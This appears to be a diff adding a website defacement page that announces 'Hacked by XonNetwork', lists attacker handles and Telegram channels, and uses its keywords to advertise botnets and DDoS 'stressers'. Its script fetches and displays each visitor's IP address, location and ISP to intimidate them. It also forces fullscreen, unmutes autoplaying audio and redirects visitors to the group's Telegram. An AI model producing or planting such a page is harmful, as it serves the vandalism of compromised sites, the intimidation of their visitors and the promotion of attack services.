@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Hacked by XonNetwork</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Hacked by XonNetwork. Hegemon-Jzofe-ACEVeen">
+  <meta name="keywords" content="Hacked by ACEVeen, Hacked by Hegemon, xonnetwork, Xon Network, botnet, ddos, free botnet, free stresser, free layer4 stresser, free layer7 stresser, hegemon, jzofe, fyks, hegemonq, aceveen, ACE Veen, aceveen1337, aceveen1948, xonnet, xon botnet, free DDoS protection, network attack tools, Layer4 attack, Layer7 attack, Ace Veen, Hacked by Ace Veen">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      background-color: #0a0a0a;
+      color: #00ffc3;
+      font-family: 'Share Tech Mono', monospace;
+      overflow: hidden;
+    }
+ 
+    .background {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      background: url('https://media1.giphy.com/media/2p1ng5ek9qIR8wzPn5/giphy.gif?cid=6c09b9521h499o74vto736gl56bijr5qelguiqmyke7fxlxk&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g') center center / cover no-repeat;
+      opacity: 0.04;
+      z-index: -1;
+    }
+ 
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      padding: 20px;
+      text-align: center;
+    }
+ 
+    h1 {
+      font-size: 48px;
+      color: #ff0040;
+      text-shadow: 0 0 10px #ff0040;
+      margin-bottom: 10px;
+    }
+ 
+    h2 {
+      font-size: 18px;
+      margin: 10px 0 30px;
+      color: #888;
+    }
+ 
+    .nicks {
+      display: flex;
+      gap: 15px;
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+ 
+    .nicks span {
+      color: #ffffff;
+      text-shadow: 0 0 5px #00ffc3;
+    }
+ 
+    .telegram {
+      margin-bottom: 30px;
+    }
+ 
+    a {
+      color: #00ffc3;
+      text-decoration: none;
+    }
+ 
+    .info {
+      font-size: 14px;
+      background-color: rgba(255,255,255,0.03);
+      border: 1px solid rgba(0,255,195,0.1);
+      padding: 10px;
+      border-radius: 6px;
+      width: fit-content;
+      max-width: 90%;
+      color: #ccc;
+    }
+ 
+    #countdown {
+      font-size: 18px;
+      color: #ffcc00;
+      margin-top: 20px;
+    }
+ 
+    audio {
+      display: none;
+    }
+  </style>
+</head>
+<body onclick="startAudio()">
+ 
+  <div class="background"></div>
+ 
+  <audio id="bgAudio" autoplay muted loop>
+    <source src="https://g.top4top.io/m_3384brlra1.mp3" type="audio/mpeg">
+  </audio>
+ 
+  <div class="container">
+    <h1>HACKED BY XON NETWORK</h1>
+    <h2>Nothing is secure. Everything is vulnerable.</h2>
+ 
+    <div class="nicks">
+      <span>ACE Veen</span>
+      <span>Hegemon</span>
+      <span>slore1337</span>
+      <span>Fyks</span>
+    </div>
+ 
+    <div class="telegram">
+      <a href="https://t.me/xonnetwork">@xonnetwork</a>
+    </div>
+ 
+    <div class="info" id="info-box">
+      Collecting system info...
+    </div>
+ 
+    <div id="countdown">Redirecting in 10 seconds...</div>
+  </div>
+ 
+  <script>
+    fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+            document.getElementById("info-box").innerText = `
+IP        : ${data.ip}
+Country   : ${data.country_name}
+Region    : ${data.region}
+City      : ${data.city}
+ISP       : ${data.org}
+TimeZone  : ${data.timezone}
+Browser   : ${navigator.userAgent}
+            `;
+        });
+ 
+    function openFullscreen() {
+        const docElm = document.documentElement;
+        if (docElm.requestFullscreen) {
+            docElm.requestFullscreen();
+        } else if (docElm.mozRequestFullScreen) {
+            docElm.mozRequestFullScreen();
+        } else if (docElm.webkitRequestFullscreen) {
+            docElm.webkitRequestFullscreen();
+        } else if (docElm.msRequestFullscreen) {
+            docElm.msRequestFullscreen();
+        }
+    }
+ 
+    openFullscreen();
+ 
+    if (!/Mobi|Android/i.test(navigator.userAgent)) {
+        const audio = document.getElementById('bgAudio');
+        audio.play().catch(error => {});
+        setTimeout(() => {
+            audio.muted = false;
+            audio.play().catch(err => {});
+        }, 200);
+        setTimeout(() => {
+            audio.muted = false;
+            audio.play().catch(err => {});
+        }, 500);
+    }
+ 
+    let seconds = 10;
+    const countdown = document.getElementById("countdown");
+
+    const timer = setInterval(() => {
+        seconds--;
+        countdown.innerText = `Redirecting in ${seconds} seconds...`;
+        if (seconds <= 0) {
+            clearInterval(timer);
+            var newWindow = window.open("https://t.me/therealxon", "_blank");
+            if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
+                countdown.innerText = "https://t.me/therealxon";
+            }
+        }
+    }, 1000);
+
+    function startAudio() {
+      const audio = document.getElementById("bgAudio");
+      audio.muted = false;
+      audio.play().catch(err => {});
+    }
+
+  </script>
